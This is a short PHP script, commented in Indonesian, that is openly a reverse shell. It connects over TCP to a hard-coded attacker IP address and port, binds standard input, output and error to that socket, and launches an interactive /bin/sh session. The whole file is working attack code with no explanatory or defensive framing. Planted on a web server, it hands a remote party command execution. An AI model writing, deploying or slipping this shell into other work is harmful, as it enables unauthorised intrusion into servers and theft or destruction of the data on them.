<?php
// IP dan port attacker machine
$ip = "207.148.70.80";
$port = 421;

// Membuka koneksi TCP ke attacker machine
$socket = fsockopen($ip, $port);

if ($socket) {
// Mengalihkan input/output/error ke socket
$descriptorspec = array(
0 => $socket, // stdin
1 => $socket, // stdout
2 => $socket  // stderr
);

// Memulai shell interaktif
proc_open("/bin/sh -i", $descriptorspec, $pipes);
}
?>
